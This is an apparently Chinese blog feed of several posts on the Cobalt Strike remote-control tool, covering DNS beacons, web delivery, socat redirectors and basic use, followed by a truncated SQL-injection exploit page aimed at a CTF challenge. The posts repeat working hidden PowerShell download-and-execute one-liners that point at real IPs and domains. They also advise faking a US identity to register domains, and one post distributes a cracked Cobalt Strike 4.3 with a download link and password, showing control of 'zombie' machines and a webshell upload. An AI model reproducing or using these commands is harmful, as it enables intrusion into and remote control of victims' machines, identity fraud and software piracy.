<p><strong>4、这里是美国地区，所以伪造一个美国人的身份信息，利用<a href="http://shenfendaquan.com/" target="_blank" rel="noopener">美国人身份生成网站</a>，同理，如果你是德国地区，去找一个伪造德国人身份的网站就行了。接着输入，我们刚刚查到的州名字</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904152814017.png" alt="image-20210904152814017"></p>
</blockquote>
<p><strong>5、将获得的信息填入订单信息中，然后提交，这样应该不会报错</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904152846467.png" alt="image-20210904152846467"></p>
</blockquote>
<p><strong>6、接着进入自己的域名区域</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904152917063.png" alt="image-20210904152917063"></p>
</blockquote>
<p><strong>7、可以看到多了一个</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904152942182.png" alt="image-20210904152942182"></p>
</blockquote>
<p><strong>8、打开<a href="https://console.dnspod.cn/" target="_blank" rel="noopener">dns解析的服务器</a>，注册一个号，添加域名</strong>，他会提醒你要修改原服务器的ns，所以改一下，不然没用了</p>
<p><strong>①点管理域</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904153532731.png" alt="image-20210904153532731"></p>
</blockquote>
<p><strong>②在管理工具中的NamesServers中点击自定义服务器名，这样就完成了，可以解析了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904155259321.png" alt="image-20210904155259321"></p>
</blockquote>
<p><strong>9、就可以看到解析成功了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904155446681.png" alt="image-20210904155446681"></p>
</blockquote>
<p><strong>10、绕了一路终于到了设置解析了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904155623524.png" alt="image-20210904155623524"></p>
</blockquote>
<p><strong>11、接着在vps中打开teamserver，就可以连接了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904155800074.png" alt="image-20210904155800074"></p>
</blockquote>
<h1 id="DNS-beacon-cs上线"><a href="#DNS-beacon-cs上线" class="headerlink" title="DNS beacon cs上线"></a>DNS beacon cs上线</h1><p><strong>其实只要前面的步骤都做对了，后面的操作就比较基础了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904150310151.png" alt="image-20210904150310151"></p>
</blockquote>
<p><strong>1、支持命令行切换到该模式：mode dns，将http通信方式，改为使用dns的a记录方式进行通信(传输数据小)，下面和上面的差不多</strong></p>
<p><strong>2、同上，mode dns-txt只是改为使用dns的txt方法进行通信（传输数据大）有效负载使用dns txt记录下载和分级混合http和dns beacon</strong></p>
<p>首先打开监听，然后按照图片设置，默认是53端口</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904160032890.png" alt="image-20210904160032890"></p>
</blockquote>
<p><strong>景象会是这样的</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904160115047.png" alt="image-20210904160115047"></p>
</blockquote>
<p><strong>可以用lsof查看53端口是否打开</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904160243319.png" alt="image-20210904160243319"></p>
</blockquote>
<p><strong>接着用dig +trace来看看是否走的通</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904160454001.png" alt="image-20210904160454001"></p>
</blockquote>
<p><strong>内容过长，只看重点</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904160517095.png" alt="image-20210904160517095"></p>
</blockquote>
<p><strong>这就成功了，接着我们生成一个web传递试试效果</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904160650407.png" alt="image-20210904160650407"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;47.99.163.64:80&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>接着找一个windows 3以上的服务器运行一下就行了</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904161048191.png" alt="image-20210904161048191"></p>
</blockquote>
<p><strong>收到一个了一个黑屏的beacon</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904161114217.png" alt="image-20210904161114217"></p>
</blockquote>
<p><strong>接着我们可以用sleep 5 或者是checkin，将其回显</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210904161402005.png" alt="image-20210904161402005"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike脚本web传递映射公网</title>
    <url>/posts/125.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike基本学习</li>
</ul>
</blockquote>
<h1 id="一、监听器"><a href="#一、监听器" class="headerlink" title="一、监听器"></a>一、监听器</h1><p>先用花生壳将内网的80端口映射到公网http中，然后创建监听器</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210901203940392.png" alt="image-20210901203940392"></p>
</blockquote>
<p><img src="C:%5CUsers%5C23242%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210901203946860.png" alt="image-20210901203946860"></p>
<h1 id="二、接着再启动web脚本传递"><a href="#二、接着再启动web脚本传递" class="headerlink" title="二、接着再启动web脚本传递"></a>二、接着再启动web脚本传递</h1><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210906074317670.png" alt="image-20210906074317670"></p>
</blockquote>
<p><strong>可以访问公网的这个</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210901204154277.png" alt="image-20210901204154277"></p>
</blockquote>
<p>接着最后在任何一台联网的机子上用命令行执行下面命令，然后就可以cs上线了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;ad39402345.wicp.vip&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure></div>

<p>我是用花生壳内网穿透的，常识了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210901204310555.png" alt="image-20210901204310555"></p>
</blockquote>
<p>执行代码，上线其他机子结果展示</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210901204359074.png" alt=""></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控使用】Cobalt Strike使用重定器</title>
    <url>/posts/121.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike基本学习</li>
</ul>
</blockquote>
<p>目标</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210901154227983.png" alt="image-20210901154227983"></p>
</blockquote>
<h1 id="Cobalt-Stike重定向"><a href="#Cobalt-Stike重定向" class="headerlink" title="Cobalt Stike重定向"></a>Cobalt Stike重定向</h1><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210831105934755.png" alt="image-20210831105934755"></p>
</blockquote>
<p><strong>接着下一步，就是让r1-r3这三台linux主机重定向到我们的teamserver中，可以使用socat来做</strong></p>
<blockquote>
<p>DNS系统域名 <strong>dj.com</strong></p>
<p>teamserver <strong>team.dj.com</strong>  192.168.1.105</p>
<p>ubuntu1 <strong>r1.dj.com</strong>  192.168.1.107</p>
<p>ubuntu2 <strong>r2.dj.com</strong>  192.168.1.108</p>
<p>这回我们就不要r3了，我电脑运行太多虚拟机会卡</p>
</blockquote>
<p>接着就可以用这个定义的A记录域名，直接上cs</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210831111049390.png" alt="image-20210831111049390"></p>
<h1 id="这里就要用到socat来进行重定向"><a href="#这里就要用到socat来进行重定向" class="headerlink" title="这里就要用到socat来进行重定向"></a>这里就要用到socat来进行重定向</h1><p><strong>工具socat（一款端口重定向工具）我们用它来建立80端口上的连接管理，并且继续在80端口运行那个连接团队服务器的连接。</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:80,fork TCP4:team.dj.com:80</span><br></pre></td></tr></table></figure></div>

<p>直接用apt安装socat</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">apt-get install socat</span><br></pre></td></tr></table></figure></div>

<p>接着r1,r2执行这个命令，如果端口被占用可以关掉服务，我这边是关掉apache2</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;apache2 stop</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210831223456896.png" alt="image-20210831223456896"></p>
</blockquote>
<p>打开cs，创建一个监听窗口，让他访问我们的第一个A地址解析的r1</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210901154530913.png" alt="image-20210901154530913"></p>
</blockquote>
<p><strong>设置我们所有A记录被轮流访问</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210901155233076.png" alt="image-20210901155233076"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;r1.dj.com:80&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210901053743593.png" alt="image-20210901053743593"></p>
<p>接着就能实现每个A轮流返回powershell</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210901204359074.png" alt="image-20210901204359074"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【知识积累】Cobalt Strike基本操作</title>
    <url>/posts/120.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>Cobalt Strike基本学习</li>
</ul>
</blockquote>
<h1 id="一、基础了解CS"><a href="#一、基础了解CS" class="headerlink" title="一、基础了解CS"></a>一、基础了解CS</h1><h2 id="启动CS"><a href="#启动CS" class="headerlink" title="启动CS"></a>启动CS</h2><p>基本架构是C/S，所以得先启动服务器</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829113459470.png" alt="image-20210829113459470"></p>
</blockquote>
<p>然后连接上去</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829113533498.png" alt="image-20210829113533498"></p>
</blockquote>
<p>这是界面</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829113607062.png" alt="image-20210829113607062"></p>
</blockquote>
<p>kali里面也可以使用命令启动</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829114227211.png" alt="image-20210829114227211"></p>
</blockquote>
<h2 id="让目标连接上teamserver"><a href="#让目标连接上teamserver" class="headerlink" title="让目标连接上teamserver"></a>让目标连接上teamserver</h2><p>1、设置监听器</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829115024046.png" alt="image-20210829115024046"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829115228611.png" alt="image-20210829115228611"></p>
</blockquote>
<p>2、生成攻击载荷，在钓鱼攻击里面的<code>脚本web传递</code></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829115102770.png" alt="image-20210829115102770"></p>
</blockquote>
<p>①url 它是个文件路径</p>
<p>②就是让目标通过这个地址和端口下载恶意脚本</p>
<p>③目标机子运行</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829115854163.png" alt="image-20210829115854163"></p>
</blockquote>
<p>得到payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.0.101:26240/a'))"</span><br></pre></td></tr></table></figure></div>

<p>访问:26240/a路径的ip会发现有恶意代码</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829120336420.png" alt="image-20210829120336420"></p>
</blockquote>
<p>这份代码就是 powershell运行 加载到内存执行</p>
<p>3、目标机执行payload</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829120754957.png" alt="image-20210829120754957"></p>
</blockquote>
<p>接着就上线cs了</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829120818237.png" alt="image-20210829120818237"></p>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210829121110889.png" alt="image-20210829121110889"></p>
<h1 id="二、个人博客"><a href="#二、个人博客" class="headerlink" title="二、个人博客"></a>二、个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>知识积累</tag>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>【远控工具】Cobalt Strike 4.3破解版</title>
    <url>/posts/132.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Cobalt-Strike-4-3更新日志"><a href="#Cobalt-Strike-4-3更新日志" class="headerlink" title="Cobalt Strike 4.3更新日志"></a>Cobalt Strike 4.3更新日志</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">-------------</span><br><span class="line">+添加了对dns-beacon Malleable C2组的支持。</span><br><span class="line">  添加了DNS主机指示器的选项：</span><br><span class="line">  信标，get_A，get_AAAA，get_TXT，put_metadata，put_output</span><br><span class="line">  可更改的C2 Lint更改为支持dns-beacon组。</span><br><span class="line">+允许DNS信标直接通过指定的DNS解析器出口，</span><br><span class="line">  而不是使用目标服务器上的默认解析器。</span><br><span class="line">+主机轮换策略，用于自定义DNS &#x2F; HTTP &#x2F; HTTPS信标的主机选择。</span><br><span class="line">+允许HTTP &#x2F; HTTPS配置被阻止的用户代理（以前为curl &#x2F; lynx &#x2F; wget）。</span><br><span class="line">  向Malleable C2添加了.http-config.block_useragents。</span><br><span class="line">+添加了对来自特定DNS解析器的NS请求的响应支持。</span><br><span class="line">  添加了.dns-beacon.ns_response可延展C2选项。</span><br><span class="line">+将时间戳添加到信标控制台消息。</span><br><span class="line">  可以在“首选项”（“控制台”选项卡）中启用&#x2F;禁用timestamp选项。</span><br><span class="line">  可以使用侵略者脚本修改时间戳格式。</span><br><span class="line">  请参阅default.cna中的BEACON_CONSOLE_TIMESTAMP和SSH_CONSOLE_TIMESTAMP。</span><br><span class="line">+在脚本化Web交付中添加PowerShell IEX选项</span><br><span class="line">+修复了退出后导致信标不退出的睡眠命令。</span><br><span class="line">+可锻C2棉绒在分阶段预览中错误地显示了抖动数据。</span><br><span class="line">+修复了无效的帮助链接（攻击-&gt;程序包-&gt; Windows可执行文件）</span><br><span class="line">+在可锻C2中将睡眠设置为0会导致信标失败。</span><br><span class="line">  为睡眠值添加C2皮棉范围。</span><br><span class="line">+修复了data_jitter超过限制（921600）时不使用任何抖动的问题。</span><br><span class="line">  添加了最小data_jitter（10）和超过10000的性能警告。</span><br><span class="line">  在C2 Lint预览数据而不是实际抖动数据中显示data_jitter标记。</span><br></pre></td></tr></table></figure></div>

<h2 id="Cobalt-Strike-4-3破解版包含的文件"><a href="#Cobalt-Strike-4-3破解版包含的文件" class="headerlink" title="Cobalt Strike 4.3破解版包含的文件"></a>Cobalt Strike 4.3破解版包含的文件</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">│  .cobaltstrike.beacon_keys</span><br><span class="line">│  agscript</span><br><span class="line">│  c2lint</span><br><span class="line">│  cobaltstrike</span><br><span class="line">│  cobaltstrike.auth</span><br><span class="line">│  cobaltstrike.jar</span><br><span class="line">│  hook.jar</span><br><span class="line">│  icon.jpg</span><br><span class="line">│  license.pdf</span><br><span class="line">│  peclone</span><br><span class="line">│  readme.txt</span><br><span class="line">│  start.bat</span><br><span class="line">│  start.sh</span><br><span class="line">│  teamserver</span><br><span class="line">│  update</span><br><span class="line">│  update.jar</span><br><span class="line">│</span><br><span class="line">├─third-party</span><br><span class="line">│      README.winvnc.txt</span><br><span class="line">│      winvnc.x64.dll</span><br><span class="line">│      winvnc.x86.dll</span><br><span class="line">│</span><br><span class="line">└─Toolkits</span><br><span class="line">        .DS_Store</span><br><span class="line">        applet.tgz</span><br><span class="line">        artifact.tgz</span><br><span class="line">        ElevateKit.zip</span><br><span class="line">        Malleable-C2-Profiles.zip</span><br><span class="line">        powerapplet.tgz</span><br><span class="line">        resourcekit.tgz</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a></p>
<h2 id="Cobalt-Strike-4-3-www-ddosi-org-rar-校验码"><a href="#Cobalt-Strike-4-3-www-ddosi-org-rar-校验码" class="headerlink" title="Cobalt Strike 4.3_www.ddosi.org.rar 校验码"></a><strong>Cobalt Strike 4.3_<a href="http://www.ddosi.org.rar" target="_blank" rel="noopener">www.ddosi.org.rar</a></strong> 校验码</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">Cobalt Strike 4.3_www.ddosi.org.rar</span><br><span class="line"></span><br><span class="line">sha256:</span><br><span class="line">ee229e50d816fb36dfffcb50e89d95c312564f57685aa22b6490917fecd53795</span><br><span class="line"></span><br><span class="line">md5</span><br><span class="line">:</span><br><span class="line">7333a62bffd1c534f3adb9e2a192117c</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3-1.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3-1.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a></p>
<h3 id="cobaltstrike-jar-sha256校验码"><a href="#cobaltstrike-jar-sha256校验码" class="headerlink" title="cobaltstrike.jar sha256校验码"></a>cobaltstrike.jar sha256校验码</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line"># Cobalt Strike 4.3 (March 3, 2021)</span><br><span class="line">02fa5afe9e58cb633328314b279762a03894df6b54c0129e8a979afcfca83d51	</span><br><span class="line">Cobalt Strike 4.3 Licensed (cobaltstrike.jar)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3_1.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3_1.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a></p>
<p><strong>和官网sha256校验码一致</strong></p>
<p><a href="https://verify.cobaltstrike.com/" target="_blank" rel="noopener">https://verify.cobaltstrike.com/</a></p>
<h2 id="Cobalt-Strike-4-3破解版下载地址"><a href="#Cobalt-Strike-4-3破解版下载地址" class="headerlink" title="Cobalt Strike 4.3破解版下载地址"></a>Cobalt Strike 4.3破解版下载地址</h2><p>迅雷网盘:<a href="https://pan.xunlei.com/s/VMZ7FqebKYsdXzQF9yTnADl5A1" target="_blank" rel="noopener">https://pan.xunlei.com</a> 提取码: 6kep<br>解压密码: <a href="http://www.ddosi.org" target="_blank" rel="noopener">www.ddosi.org</a></p>
<h2 id="Cobalt-Strike-4-3破解版使用截图"><a href="#Cobalt-Strike-4-3破解版使用截图" class="headerlink" title="Cobalt Strike 4.3破解版使用截图"></a>Cobalt Strike 4.3破解版使用截图</h2><h3 id="linux下启动"><a href="#linux下启动" class="headerlink" title="linux下启动"></a>linux下启动</h3><p>命令为</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;start.sh</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3_2.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3_2.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a>登陆界面截图</p>
<h3 id="windows下启动"><a href="#windows下启动" class="headerlink" title="windows下启动"></a>windows下启动</h3><p>双击start.bat即可</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3_4.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3_4.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a></p>
<p>远程控制成功上线截图</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3_3.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3_3.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a></p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3_5.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3_5.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a></p>
<h3 id="肉鸡上线截图"><a href="#肉鸡上线截图" class="headerlink" title="肉鸡上线截图"></a>肉鸡上线截图</h3><p>文件读取测试</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3_6.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3_6.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a></p>
<p>文件下载测试</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3_8.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3_8.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a></p>
<p>文件/php大马上传测试</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3_9.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3_9.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a></p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3_10.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3_10.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a>成功上传dd.php大马</p>
<p>肉鸡/被控者屏幕截图</p>
<p><a href="https://www.ddosi.org/wp-content/uploads/2021/04/cs4.3_7.png" target="_blank" rel="noopener"><img src="https://gylq.gitee.io/cloudimages/img/cs4.3_7.png" alt="Cobalt Strike 4.3破解版|cs4.3破解版下载|cracked"></a></p>
<p><strong>当然 cobalt strike的关键是免杀</strong></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>Cobalt Strike 4.3破解版来源于国外论坛,<br><strong>亲测可用</strong><br>安全性自测,<br>切勿用于违法犯罪,仅可作为研究使用.</p>
<p><a href="https://www.ddosi.org/cobalt_strike_4_3/" target="_blank" rel="noopener">from</a></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>Cobalt Strike</tag>
        <tag>cracked</tag>
        <tag>远控工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【EXP编写】注入EXP的简单编写</title>
    <url>/posts/115.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p><strong>制作简单exp的学习记录</strong></p>
</blockquote>
<h1 id="一、简单的HTML编写注入EXP"><a href="#一、简单的HTML编写注入EXP" class="headerlink" title="一、简单的HTML编写注入EXP"></a><strong>一、简单的HTML编写注入EXP</strong></h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>简单的HTML EXP编写<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">action</span>=<span class="string">"http://ebc14e18-2cda-4cd7-b884-c4261c48768f.challenge.ctf.show:8080/"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"id"</span> <span class="attr">value</span>=<span class="string">"1.1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())#"</span>/&gt;</span></span><br><span class="line">		